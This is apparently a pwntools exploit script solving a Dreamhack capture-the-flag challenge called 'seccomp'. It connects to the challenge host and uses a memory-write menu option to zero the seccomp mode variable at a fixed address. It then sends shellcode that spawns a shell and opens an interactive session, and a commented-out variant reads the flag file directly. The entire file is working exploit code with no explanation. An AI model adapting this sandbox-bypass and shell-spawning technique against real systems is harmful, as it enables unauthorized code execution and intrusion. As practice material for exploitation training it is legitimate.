from pwn import *

# p = process("./seccomp")
# nc host3.dreamhack.games 14216
p = remote("host3.dreamhack.games", 14216)

context.arch = "amd64"
mode = 0x602090

def read_shellcode(shellcode):
    p.sendlineafter(">", "1")
    p.sendafter("e:", shellcode)
    
def exec_shellcode():
    p.sendlineafter(">", "2")
    
def write_adress(addr, value):
    p.sendlineafter(">", "3")
    p.sendlineafter(":", str(addr))
    p.sendlineafter(":", str(value))


shellcode = asm(shellcraft.sh())
# shellcode = shellcraft.openat(0, "/home/seccomp/flag", 0)
# shellcode += shellcraft.sendfile(1, 'rax', 0, 0x100)

write_adress(mode, 0)
read_shellcode(shellcode)
exec_shellcode()
    

p.interactive()